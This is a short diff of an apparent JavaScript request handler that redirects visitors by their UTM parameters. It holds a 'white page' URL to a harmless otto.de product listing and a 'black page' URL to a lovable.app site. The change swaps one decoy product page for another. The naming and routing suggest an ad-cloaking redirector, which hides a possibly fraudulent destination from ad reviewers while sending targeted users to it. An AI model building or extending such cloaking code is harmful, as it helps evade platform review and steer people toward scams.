@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/sportikel24-huerde-x-fuss-huerdenset-mit-stange-180-cm-farbe-orange-leichte-montage-S0YE20OV/";
+    const whitePageURL = "https://www.otto.de/p/forrlite-babytrage-babytrage-4-in-1-trage-ergonomisch-fuer-neugeborene-und-aeltere-babys-babytrage-marsupi-babytrage-rookie-babytrage-S0REP0RI/";
     const blackPageURL = "https://casssshlov.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
